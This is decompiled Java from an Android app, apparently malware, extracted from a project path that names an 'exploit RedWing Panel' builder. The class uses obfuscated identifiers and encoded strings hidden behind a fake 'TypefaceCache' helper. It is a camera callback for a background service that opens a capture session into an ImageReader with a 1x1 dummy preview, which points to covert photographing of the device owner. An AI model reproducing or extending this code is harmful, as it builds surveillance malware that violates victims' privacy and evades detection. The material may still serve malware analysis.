package v.s;

import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraDevice;
import android.media.ImageReader;
import android.view.Surface;
import app.mobilex.plus.services.ConfigTQWorker;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Collections;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class ZSUCCvgkLgfCSFv extends CameraDevice.StateCallback {
    public final /* synthetic */ ConfigTQWorker dDIMxZXP1V8HdM;

    public ZSUCCvgkLgfCSFv(ConfigTQWorker configTQWorker) {
        this.dDIMxZXP1V8HdM = configTQWorker;
    }

    private static /* synthetic */ void pwkwgtfpu() {
    }

    @Override // android.hardware.camera2.CameraDevice.StateCallback
    public final void onDisconnected(CameraDevice cameraDevice) {
        byte[] bArr = ConfigTQWorker.ibVTtJUNfrGYbW;
        TypefaceCache.obtain("000000770056008200E200BE009200A3002A00650058008800FE00B100D700A400370073005F");
        this.dDIMxZXP1V8HdM.dDIMxZXP1V8HdM();
    }

    @Override // android.hardware.camera2.CameraDevice.StateCallback
    public final void onError(CameraDevice cameraDevice, int i) {
        byte[] bArr = ConfigTQWorker.ibVTtJUNfrGYbW;
        TypefaceCache.obtain("000000770056008200E200BE009200A2003100640054009500AA00FF");
        ConfigTQWorker configTQWorker = this.dDIMxZXP1V8HdM;
        configTQWorker.dDIMxZXP1V8HdM();
        configTQWorker.stopSelf();
    }

    @Override // android.hardware.camera2.CameraDevice.StateCallback
    public final void onOpened(CameraDevice cameraDevice) {
        byte[] bArr = ConfigTQWorker.ibVTtJUNfrGYbW;
        TypefaceCache.obtain("000000770056008200E200BE009200A8003300730055008200F4");
        ConfigTQWorker configTQWorker = this.dDIMxZXP1V8HdM;
        configTQWorker.dDIMxZXP1V8HdM = cameraDevice;
        try {
            ImageReader imageReader = configTQWorker.w9sT1Swbhx3hs;
            Surface surface = imageReader != null ? imageReader.getSurface() : null;
            if (surface == null) {
                return;
            }
            new SurfaceTexture(10).setDefaultBufferSize(1, 1);
            CameraDevice cameraDevice2 = configTQWorker.dDIMxZXP1V8HdM;
            if (cameraDevice2 != null) {
                cameraDevice2.createCaptureSession(Collections.singletonList(surface), new Lll1MAU873FM(configTQWorker), configTQWorker.JXn4Qf7zpnLjP5);
            }
        } catch (CameraAccessException e) {
            TypefaceCache.obtain("00000064005E008600E400BA009200B4002600650048008E00FF00B1009200A2003100640054009500AA00FF");
            e.getMessage();
        }
    }
}
